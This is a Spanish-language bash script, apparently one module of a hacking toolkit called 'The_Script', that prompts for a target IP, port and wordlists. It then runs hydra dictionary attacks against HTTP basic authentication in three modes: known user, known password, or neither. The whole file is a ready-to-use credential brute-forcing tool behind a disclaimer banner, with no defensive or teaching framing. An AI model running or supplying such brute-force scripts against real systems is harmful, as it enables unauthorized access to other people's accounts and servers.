#!bin/bash

clear
echo
echo
echo "	           ████████╗██╗░░██╗███████╗░██████╗░█████╗░██████╗░██╗██████╗░████████╗"
echo "	           ╚══██╔══╝██║░░██║██╔════╝██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝"
echo "	           ░░░██║░░░███████║█████╗░░╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░"
echo "	           ░░░██║░░░██╔══██║██╔══╝░░░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░"
echo "	           ░░░██║░░░██║░░██║███████╗██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░"
echo "	           ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░"
echo
echo "				               (⌐■_■)– ︻デ═一"
echo "			     __________________________________________________"					
echo "		     	       ︻デ═一  Created by: XDeadHackerX v2.1  ︻デ═一 " 
echo "         -------------------------------------------------------------------------------------------"
echo "         Cualquier acción y o actividad relacionada con The_Script es únicamente su responsabilidad"
echo "         -------------------------------------------------------------------------------------------"
echo
echo
echo " [*] Ataque de Diccionario a IP"
echo
echo " ==================================================="
echo " 1º Si sabes el usuario pero no la Contraseña""      |"
echo " ---------------------------------------------------"
echo " 2º No sabes el usuario pero si la Contraseña""      |"
echo " ---------------------------------------------------"
echo " 3º No sabes el usuario ni la Contraseña""           |"
echo " ==================================================="
echo
read -p " Elige una opcion: " opc
	case $opc in
			1 )	read -p " Escribe la ip (Ej: 192.168.1.10): " ip
				read -p " Escribe el puerto (Ej: 80): " puerto
				read -p " Escribe el usuario (Ej: admin): " usr
				read -p " Pon la ruta del Diccionario (Ej: /home/kali/Wordlists/pass.txt): " dicc
				hydra -s $puerto -l $usr -P $dicc $ip http-get / -f -V
				;;
			2 )	read -p " Escribe la ip (Ej: 192.168.1.10): " ip
				read -p " Escribe el puerto (Ej: 80): " puerto
				read -p " Escribe la Contraseña (Ej: admin): " pass
				read -p " Pon la ruta del Diccionario (Ej: /home/kali/Wordlists/usr.txt): " dicc
				hydra -s $puerto -L $dicc -p $pass $ip http-get / -f -V
				;;
			3 )	read -p " Escribe la ip (Ej: 192.168.1.10): " ip
				read -p " Escribe el puerto (Ej: 80): " puerto
				read -p " Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " dicc1
				read -p " Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " dicc2
				hydra -s $puerto -L $dicc1 -P $dicc2 $ip http-get / -f -V
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
echo
echo " ==================="
echo " 1-Volver al Menu"
echo " 2-Volver a ejecutar"
echo " 3-Salir"
echo " ==================="
echo
read -p " Elige una opcion: " opc2
	case $opc2 in
			1 )	bash the_script.sh
				;;
			2 )	bash requisitos/5.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
